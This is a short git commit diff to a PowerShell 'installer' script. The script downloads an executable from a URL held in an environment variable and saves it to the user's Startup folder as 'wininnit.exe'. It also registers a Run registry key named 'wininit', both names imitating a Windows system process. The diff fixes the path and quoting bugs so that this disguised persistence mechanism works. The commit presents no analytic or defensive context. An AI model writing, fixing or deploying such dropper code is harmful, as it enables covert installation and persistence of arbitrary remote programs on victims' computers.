a5875b3a21a8f6a59575476ee67061502d0ef044
sushimampfer <sushimampfer@duck.com>
2025-07-26 19:07:48 +0200

    test

--- submissions/installer/installer.ps1
+++ submissions/installer/installer.ps1
@@ -1,7 +1,7 @@
 switch ( $env:method )
 {
     1 {
-        $dest = Join-Path $env:APPDATA "MICROSOFT\WINDOWS\START_MENU\PROGRAMS\STARTUP\wininnit.exe"
+        $dest = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\wininnit.exe"
         Invoke-RestMethod -Uri $env:url -OutFile $dest
     }
     2 {
@@ -11,7 +11,7 @@ switch ( $env:method )
             Path = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
             Name = 'wininit'
             PropertyType = 'String'
-            Value = '$dest'
+            Value = $dest
         }
         New-ItemProperty @newItemPropertySplat
     }
